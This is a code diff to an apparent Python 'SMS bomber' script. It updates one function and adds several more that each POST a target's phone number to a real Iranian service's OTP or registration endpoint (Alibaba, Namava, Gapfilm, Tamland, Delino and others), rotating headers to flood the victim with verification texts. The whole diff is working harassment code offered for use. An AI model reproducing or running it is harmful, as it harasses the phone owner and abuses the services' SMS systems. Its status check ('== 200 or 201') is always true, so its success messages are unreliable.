@@ -179,8 +179,8 @@ def snap_bomber(number):
 
 def tapsi_bomber(number):
     random_choose = random.choice(heads)
-    tapsi_api = 'https://tap33.me/api/v2/user'
-    json_request_api = {"credential":{"phoneNumber":number,"role":"DRIVER"}}
+    tapsi_api = 'https://api.tapsi.cab/api/v2.2/user'
+    json_request_api = {"credential":{"phoneNumber":"0"+number,"role":"PASSENGER"},"otpOption":"SMS"}
     try:
         req = requests.post(tapsi_api,json=json_request_api,headers=random_choose)
         if req.status_code == 200 or 201:
@@ -454,10 +454,93 @@ def pindo_bomber(number):
     except:
         print('pindo error!')
 
+def karlancer_bomber(number):
+    random_choose = random.choice(heads)
+    karlancer_api = 'https://www.karlancer.com/api/register'
+    json_request_api = {"phone":"0"+number,"role":"freelancer"}
+    try:
+        req = requests.post(karlancer_api,json=json_request_api,headers=random_choose)
+        if req.status_code == 200 or 201:
+            print('karlancer code sent!')
+        else:
+            print(f'karlancer code: {req.status_code}')
+    except:
+        print('karlancer error!')
 
+def alibaba_bomber(number):
+    random_choose = random.choice(heads)
+    alibaba_api = 'https://ws.alibaba.ir/api/v3/account/mobile/otp'
+    json_request_api = {"phoneNumber":"0"+number}
+    try:
+        req = requests.post(alibaba_api,json=json_request_api,headers=random_choose)
+        if req.status_code == 200 or 201:
+            print('alibaba Code Sent!')
+        else:
+            print(f"alibaba code: {req.status_code}")
+    except:
+        print('alibaba error!')
 
+def namava_bomber(number):
+    random_choose = random.choice(heads)
+    namava_api = 'https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request'
+    json_request_api =  {"UserName":"+98-"+number}  
+    try:
+        req = requests.post(namava_api,json=json_request_api,headers=random_choose)
+        if req.status_code == 200 or 201:
+            print('namava Code Sent!')
+        else:
+            print(f"namava code: {req.status_code}")
+    except:
+        print('namava error!') 
 
+def gapfilm_bomber(number):
+    random_choose = random.choice(heads)
+    gapfilm_api = 'https://core.gapfilm.ir/api/v3.1/Account/Login'
+    json_request_api =  {"Type":3,"Username":number,"SourceChannel":"GF_WebSite","SourcePlatform":"desktop","SourcePlatformAgentType":"Firefox","SourcePlatformVersion":"102.0","GiftCode":""}
+    try:
+        req = requests.post(gapfilm_api,json=json_request_api,headers=random_choose)
+        if req.status_code == 200 or 201:
+            print('gapfilm Code Sent!')
+        else:
+            print(f"gapfilm code: {req.status_code}")
+    except:
+        print('gapfilm error!') 
 
+def tebinja_bomber(number):
+    random_choose = random.choice(heads)
+    tebinja_api = 'https://www.tebinja.com/api/v1/users'
+    json_request_api =  {"username":"0"+number,"captchaHash":"","captchaValue":""}
+    try:
+        req = requests.post(tebinja_api,json=json_request_api,headers=random_choose)
+        if req.status_code == 200 or 201:
+            print('tebinja Code Sent!')
+        else:
+            print(f"tebinja code: {req.status_code}")
+    except:
+        print('tebinja error!') 
 
+def tamland_bomber(number):
+    random_choose = random.choice(heads)
+    tamland_api = 'https://lms.tamland.ir/api/api/user/signup'
+    json_request_api = {"Mobile":"0"+number,"SchoolId":-1,"consultantId":""}
+    try:
+        req = requests.post(tamland_api,json=json_request_api,headers=random_choose)
+        if req.status_code == 200 or 201:
+            print('tamland Code Sent!')
+        else:
+            print(f"tamland code: {req.status_code}")
+    except:
+        print('tamland error!')   
 
-
+def delino_bomber(number):
+    random_choose = random.choice(heads)
+    delino_api = 'https://www.delino.com/user/register'
+    json_request_api = {"mobile":"0"+number}
+    try:
+        req = requests.post(delino_api,json=json_request_api,headers=random_choose)
+        if req.status_code == 200 or 201:
+            print('delino Code Sent!')
+        else:
+            print(f"delino code: {req.status_code}")
+    except:
+        print('delino error!')  
